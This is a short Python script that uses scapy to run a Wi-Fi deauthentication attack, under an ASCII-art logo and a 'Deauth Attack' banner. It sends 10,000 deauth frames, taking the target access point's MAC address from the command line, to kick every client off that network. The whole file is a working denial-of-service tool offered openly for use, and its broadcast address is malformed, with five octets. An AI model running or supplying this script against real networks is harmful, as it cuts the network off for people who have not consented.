import sys
import scapy
import pyfiglet
from scapy.all import *
from scapy.all import sendp, conf
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth


show = """
                                    
                                     `-/osssssssssssssssssso+:.                                     
                                   ./ossssssssssssssssssssssssso:`                                  
                                 -+sssssssso/:-...`..-:/+ossssssss/.                                
                               .+ssssssss/``             `.:+sssssss/`                              
                              :sssssssssss/`                 ./sssssso.                             
                             /ssssss/ossssss:.-:////:--.``     .+ssssss-                            
                            /ssssso. `/yhdmNNNMMMNNNMMMNmhs+-`   :ssssss.                           
                           -ssssso``-odMMMNNmdhy/::::/+shmNMMmy:` :ssssso`                          
                           osssss-+dMMNy+/sssssys-````    ./ymMMmo./sssss/                          
                          -sssss+sMMh/`   .ydmNNNNNmmdys/.`  `:yNMd.ssssss                          
                          /sssss- --   .odMMMNNmmmmmmdNMMMms:   ./  +sssss`                         
                          /sssss-    .hMMNy/. :sssssso-./sNMMm/     +sssss`                         
                          /sssss-     :h+`   .:odmmmdhy+`  :ho`     osssss`                         
                          -sssss+         .omNMMmmmNMMMNd/         `ssssso                          
                           osssss-        :dms:````/shdNMdo.       +sssss:                          
                           -ssssso.        ``  .:++/:+syysss/`    :ssssso`                          
                            /ssssso-          -dMMMMm+-ossssso-  /ssssss.                           
                             /ssssss/`         .omNy-  `/ssssss++ssssso.                            
                              :sssssso:.         .:      .+ssssssssss+.                             
                               .+sssssss+:.`             `-ossssssso:`                              
                                 -+sssssssso+/:--...--:/+ossssssso/`                                
                                   ./osssssssssssssssssssssssss+-`                                  
                                      .:+ossssssssssssssssso/-`                                     
                                          .-://++ooo++/:-.`                                         
                                                                                            

"""

ascii_banner = pyfiglet.figlet_format("Deauth Attack")
sendmac= "ff:ff:ff:ff:ff"

pkt = RadioTap() / Dot11(addr1 = sendmac, addr2 = sys.argv[1], addr3 = sys.argv[1])/ Dot11Deauth(reason=7)

sendp(pkt, iface="wlan0mon", count = 10000, inter = .2)
